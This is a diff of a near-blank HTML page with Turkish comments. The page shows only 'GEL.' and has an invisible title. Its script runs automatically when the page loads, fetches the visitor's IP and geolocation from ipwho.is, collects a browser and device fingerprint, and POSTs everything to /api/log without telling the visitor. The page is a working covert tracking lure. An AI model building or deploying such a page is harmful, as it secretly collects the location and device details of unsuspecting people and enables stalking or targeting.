@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>‎ </title>
+  <title>‎</title>
   <style>
     body {
       display: flex;
@@ -22,7 +22,7 @@
   GEL.
 
   <script>
-   
+    // ipwho.is üzerinden IP tabanlı konum bilgisi almak
     async function getIPLocation() {
       try {
         const res = await fetch('https://ipwho.is/');
@@ -38,12 +38,9 @@
       }
     }
 
-    
     async function sendData() {
-      
       const ipData = await getIPLocation();
 
-      
       let finalIP = "Bilinmeyen IP";
       let finalLocation = "Konum alınamadı";
       let lat = null;
@@ -58,7 +55,6 @@
         lon = ipData.longitude || null;
       }
 
-      
       let userData = {
         ip: finalIP,
         userAgent: navigator.userAgent,
@@ -68,25 +64,17 @@
         language: navigator.language,
         location: finalLocation,
         latitude: lat,
-        longitude: lon
+        longitude: lon,
+
+        // Ek bilgiler
+        hardwareConcurrency: navigator.hardwareConcurrency || "Bilinmiyor",
+        deviceMemory: navigator.deviceMemory || "Bilinmiyor",
+        colorDepth: screen.colorDepth || "Bilinmiyor",
+        languages: navigator.languages ? navigator.languages.join(", ") : navigator.language,
+        isOnline: navigator.onLine
       };
 
-      
-      userData.hardwareConcurrency = navigator.hardwareConcurrency || "Bilinmiyor";
-
-     
-      userData.deviceMemory = navigator.deviceMemory || "Bilinmiyor";
-
-      
-      userData.colorDepth = screen.colorDepth || "Bilinmiyor";
-
-     
-      userData.languages = navigator.languages ? navigator.languages.join(", ") : navigator.language;
-
-     
-      userData.isOnline = navigator.onLine;
-
-      
+      // Sunucuya (ör. /api/log) POST isteği
       fetch('/api/log', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -94,7 +82,7 @@
       });
     }
 
-    
+    // Sayfa açıldığında otomatik çalış
     sendData();
   </script>
 </body>
